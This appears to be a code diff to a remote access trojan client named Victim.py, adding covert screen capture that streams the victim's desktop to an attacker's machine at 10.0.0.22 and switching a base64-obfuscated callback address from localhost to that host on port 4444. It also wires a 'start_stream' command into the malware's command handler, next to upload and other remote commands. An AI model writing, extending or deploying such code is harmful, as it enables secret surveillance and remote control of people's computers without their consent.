@@ -1,3 +1,4 @@
+#Victim.py
 import os
 import socket
 import subprocess
@@ -14,6 +15,53 @@ import requests
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import threading
 import shutil
+import cv2
+import numpy as np
+import pyautogui
+import struct
+
+
+class FullFrameStreamer:
+    def __init__(self, server_ip, port=5001):
+        self.server_ip = server_ip
+        self.port = port
+        self.quality = 90  # Max JPEG quality
+        self.resolution = (1280, 720)  # Native resolution
+        self.running = False
+
+    def connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.sock.connect((self.server_ip, self.port))
+            self.running = True
+            self.stream_thread = threading.Thread(target=self.capture_stream)
+            self.stream_thread.start()
+        except ConnectionRefusedError:
+            print("Connection failed - ensure Attacker is running")
+
+    def capture_stream(self):
+        try:
+            while self.running:
+                # Capture and process frame
+                screen = pyautogui.screenshot()
+                frame = cv2.resize(np.array(screen), self.resolution)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                
+                # Encode as full-quality JPEG
+                _, jpg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
+                
+                # Send frame with header
+                header = struct.pack('!I', len(jpg))  # 4-byte size header
+                self.sock.sendall(header + jpg.tobytes())
+                
+                time.sleep(0.016)  # ~60 FPS
+
+        except Exception as e:
+            print(f"Streaming error: {str(e)}")
+            s.send(f"Streaming error: {str(e)}\n".encode())
+        finally:
+            self.sock.close()
+            self.running = False
 
 # Get the path to the Documents folder
 documents_path = os.path.expanduser('~\\Documents')
@@ -40,8 +88,8 @@ def start_server():
     httpd.serve_forever()
 
 # Obfuscated target IP and port
-#encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
-encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
+encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
+#encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
 encoded_port = "NDQ0NA=="        # Base64 encoded "4444"
 
 # Decode the target IP and port
@@ -203,6 +251,11 @@ def handle_connection(s):
                     except requests.exceptions.RequestException as e:
                         print(f"Error: {e}")
                         output = f"Error: {e}"
+
+                elif command == ("start_stream"):
+                    streamer = FullFrameStreamer('10.0.0.22')  # Replace with actual IP
+                    streamer.connect()
+                    output = "Streaming started\n"
 
 
                 elif command.startswith("upload "):
